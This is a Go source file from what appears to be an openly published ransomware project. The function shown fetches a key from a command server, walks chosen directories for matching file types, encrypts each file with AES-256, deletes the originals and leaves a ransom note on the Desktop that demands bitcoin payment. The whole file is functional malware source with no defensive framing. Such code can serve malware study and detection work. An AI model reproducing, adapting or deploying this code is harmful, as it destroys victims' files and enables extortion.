package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"

	"github.com/mauri870/cryptofile/crypto"
	"github.com/mauri870/ransomware/client"
	"github.com/mauri870/ransomware/utils"
)

func encryptFiles() {
	// Get the id and encryption key from server
	res, err := client.CallServer("api/generatekeypair")
	if err != nil {
		log.Fatal("Probably the server is down or not accepting connections. Aborting...")
	}
	defer res.Body.Close()

	body, _ := ioutil.ReadAll(res.Body)
	keys, err := client.ParseServerJson(body)
	if err != nil {
		log.Fatalf("%s. Aborting...", err)
	}

	log.Println("Walking interesting dirs and indexing files...")

	// Loop over the interesting directories
	for _, f := range InterestingDirs {
		folder := BaseDir + f
		filepath.Walk(folder, func(path string, f os.FileInfo, err error) error {
			ext := filepath.Ext(path)
			if ext != "" {
				// Matching extensions
				if utils.StringInSlice(ext[1:], InterestingExtensions) {
					MatchedFiles = append(MatchedFiles, path)
					log.Println("Matched:", path)
				}
			}
			return nil
		})
	}

	// Loop over the matched files
	for _, path := range MatchedFiles {
		log.Printf("Encrypting %s...\n", path)

		// Read the file content
		text, _ := ioutil.ReadFile(path)

		// Encrypting using AES-256-CBC
		ciphertext, err := crypto.Encrypt([]byte(keys["enckey"]), text)
		if err != nil {
			// In case of error, continue to the next file
			log.Println(err)
			continue
		}

		// Write a new file with the encrypted content followed by the custom extension
		ioutil.WriteFile(path+EncryptionExtension, ciphertext, 0600)

		// Remove the original file
		os.Remove(path)
	}

	if len(MatchedFiles) > 0 {
		message := `
		YOUR FILES HAVE BEEN ENCRYPTED USING A STRONG 
		AES-256 ALGORITHM.

		YOUR IDENTIFICATION IS %s

		PLEASE SEND %s TO THE FOLLOWING WALLET 

				      %s

		TO RECOVER THE KEY NECESSARY TO DECRYPT YOUR
		FILES

		# The enc key is inserted for testing
		# ENCRYPTION KEY: %s

		AFTER RECOVER YOUR KEY, RUN THE FOLLOWING:
		%s decrypt yourkeyhere
		`
		content := []byte(fmt.Sprintf(message, keys["id"], "0.345 BTC", "XWpXtxrJpSsRx5dICGjUOwkrhIypJKVr", keys["enckey"], os.Args[0]))

		// Write the READ_TO_DECRYPT on Desktop
		ioutil.WriteFile(BaseDir+"Desktop\\READ_TO_DECRYPT.txt", content, 0600)

		log.Println("Done! Don't forget to read the READ_FOR_DECRYPT.txt file on Desktop")
	}
}
